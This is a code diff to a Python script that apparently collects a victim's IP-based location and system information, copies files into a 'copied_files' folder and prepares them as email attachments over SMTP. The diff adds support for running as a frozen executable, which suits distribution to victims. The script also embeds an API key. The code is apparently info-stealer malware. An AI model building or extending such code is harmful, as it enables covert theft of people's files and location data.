@@ -6,6 +6,7 @@ import os
 import psutil
 import shutil
 import smtplib
+import sys
 from email.mime.multipart import MIMEMultipart
 from email.mime.text import MIMEText
 from email.mime.application import MIMEApplication
@@ -23,6 +24,12 @@ max_attachment_size_mb = int(os.getenv("smtp_port", 25))  # Gmail attachment siz
 max_copy_amount = int(os.getenv("smtp_port", 25)) # Max amount of files to copy in MB
 
 enable_debug_prints = os.getenv("enable_debug_prints", "false").lower()
+
+# determine if application is a script file or frozen exe
+if getattr(sys, 'frozen', False):
+    application_dir = os.path.dirname(sys.executable)
+else:
+    application_dir = os.path.dirname(os.path.abspath(__file__))
 
 def get_os_info():
     return platform.platform()
@@ -169,21 +176,23 @@ def prepare_attachments(copied_files_dir):
 
 
 def scrapper():
-    with open("system_info.txt", "w") as file:
+    system_info_dir = os.path.join(application_dir, "system_info.txt")
+    with open(system_info_dir, "w") as file:
         location_info = get_location_from_api('02d299854c35db')
         file.write("\nIP-based Location Information (from API):\n\n")
         for key, value in location_info.items():
             file.write(f"{key}: {value}\n")
         file.write("\n============================\n")
     
-        current_dir = os.getcwd()
-        script_dir = os.path.dirname(os.path.abspath(__file__))
+        current_dir = application_dir
+        script_dir = application_dir
         file.write(f"\nCurrent Directory: {current_dir}\n\n")
 
         copied_files_dir = os.path.join(current_dir, 'copied_files')
         if not os.path.exists(copied_files_dir):
             os.makedirs(copied_files_dir)
 
+        os.chdir(current_dir)
         total_size = 0
         while True:
             try:
